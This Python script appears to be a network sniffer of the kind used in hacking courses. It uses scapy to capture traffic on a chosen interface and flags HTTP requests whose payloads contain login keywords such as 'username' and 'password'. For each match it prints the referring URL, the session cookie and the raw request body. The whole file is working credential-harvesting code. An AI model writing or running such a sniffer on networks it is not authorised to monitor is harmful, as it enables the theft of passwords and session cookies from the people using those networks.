#!/home/serveradmin/Desktop/security/DEV/pyhton/environments/bin/ python3

### Libs
import scapy.all as scapy
from scapy.layers import http
import optparse



### Deal with arguments passed in
def get_arguments():
    
    ### Set a parser object
    parser = optparse.OptionParser()
    
    ### Define options and their help message
    parser.add_option("-i", "--interface", dest="interface", help="Type interface name you want to listen on")
    
    ### Set options enter by the user to variables
    options = parser.parse_args()[0]
    
    ### Perform verification on user input
    if not options.interface:
        parser.error("[*] - Please specify an interface")   
    
    ### If no error found, return user input options
    return options


### Start a scapy sniffing session on the interface
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


### Analyzing outpout
def process_sniffed_packet(packet):
    
    ### Check if packet has an http request layer 
    if packet.haslayer(http.HTTPRequest):
        
        ### Check if packet has a raw layer with user input
        if packet.haslayer(scapy.Raw):
            
            ### Set the entire packet in a variable
            load = packet[scapy.Raw].load
            
            ### Commond keywords for login fields
            keywords = ["username", "user", "login", "password", "pass"]
            
            ### Iterate over every common keywords and print output to screen if match
            for word in keywords:
                if bytes(word, encoding='utf8') in load:
                    print(bytes("[+] - URL  >  ", encoding='utf8') + packet[http.HTTPRequest].Referer) 
                    print(bytes("[+] - COOKIE  >  ", encoding='utf8') + packet[http.HTTPRequest].Cookie)
                    print(bytes("[+] - LOAD  >  ", encoding='utf8') + load)
                    print('---------------------------------------------------------')
                    break




if __name__ == '__main__':
    
    ### get user arguments
    args = get_arguments()
    
    ### get argument value 
    args_int = args.interface
    
    ### start to listen
    sniff(args_int)

